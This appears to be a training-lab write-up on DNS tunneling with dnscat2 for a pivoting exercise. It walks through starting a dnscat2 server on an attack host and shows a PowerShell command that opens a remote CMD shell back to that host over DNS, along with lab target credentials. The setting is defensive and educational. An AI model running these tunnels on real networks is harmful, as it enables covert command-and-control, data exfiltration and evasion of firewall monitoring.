## DNS Tunneling with Dnscat2

[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted **Command-&-Control (C&C or C2)** channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host. 


### Target and credentials
> - 10.129.42.198 (ACADEMY-PIVOTING-WIN10PIV) 
> - Username: htb-student
> - Password: HTB_@cademy_stdnt!

1. Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer. 


### Setting Up & Using dnscat2

If dnscat2 is not already set up on our attack host, we can do so using the following commands: 

1. git clone https://github.com/iagox86/dnscat2[.]git
2. sudo gem install bundler
3. sudo bundle install 


We can then start the dnscat2 server by executing the dnscat2 file.


### Starting the dnscat2 server


![dnscat server](/dns-tunneling-w-dnscat/images/dns-server.png) 



	$ sudo dnscat2-server --dns host=10.10.14.101,port=53,domain=inlanefreight.local         

	New window created: 0
	New window created: crypto-debug
	Welcome to dnscat2! Some documentation may be out of date.

	auto_attach => false
	history_size (for new windows) => 1000
	Security policy changed: All connections must be encrypted
	New window created: dns1
	Starting Dnscat2 DNS server on 10.10.14.101:53
	[domains = inlanefreight.local]...

	Assuming you have an authoritative DNS server, you can run
	the client anywhere with the following (--secret is optional):

	  ./dnscat --secret=837c8fa09cf4db1e3704173a9e6d3529 inlanefreight.local

	To talk directly to the server without a domain name, run:

	  ./dnscat --dns server=x.x.x.x,port=53 --secret=837c8fa09cf4db1e3704173a9e6d3529

	Of course, you have to figure out <server> yourself! Clients
	will connect directly on UDP port 53.


After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target. 


### Cloning dnscat2-powershell to the Attack Host


![dnscat pwsh](/dns-tunneling-w-dnscat/images/importing-dnscat-pwsh.png) 


	$ git clone https://github.com/lukebaggett/dnscat2-powershell.git


Once the dnscat2.ps1 file is on the target we can import it and run associated cmd-lets.


### Importing dnscat2.ps1


![dnscat pwsh](/dns-tunneling-w-dnscat/images/pwsh-import.png) 


After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

	C:\ Start-Dnscat2 -DNSserver 10.10.14.101 -Domain inlanefreight.local -PreSharedSecret 837c8fa09cf4db1e3704173a9e6d3529 -Exec cmd


![Windows dnscat](/dns-tunneling-w-dnscat/images/windows-dnscat.png) 


We must use the pre-shared secret **(-PreSharedSecret)** generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server. 


### Confirming Session Establishment


![Linux dnscat](/dns-tunneling-w-dnscat/images/linux-dnscat.png) 


We can list the options we have with dnscat2 by entering **?** at the prompt. 


### Listing dnscat2 Options


![dnscat options](/dns-tunneling-w-dnscat/images/dnscat-options.png) 


We can use dnscat2 to interact with sessions and move further in a target environment on engagements. We will not cover all possibilities with dnscat2 in this module, but it is strongly encouraged to practice with it and maybe even find creative ways to use it on an engagement. Let's interact with our established session and drop into a shell. 


### Interacting with the Established Session


	dnscat> window -i 1


![dnscat options](/dns-tunneling-w-dnscat/images/dnscat-session.png) 


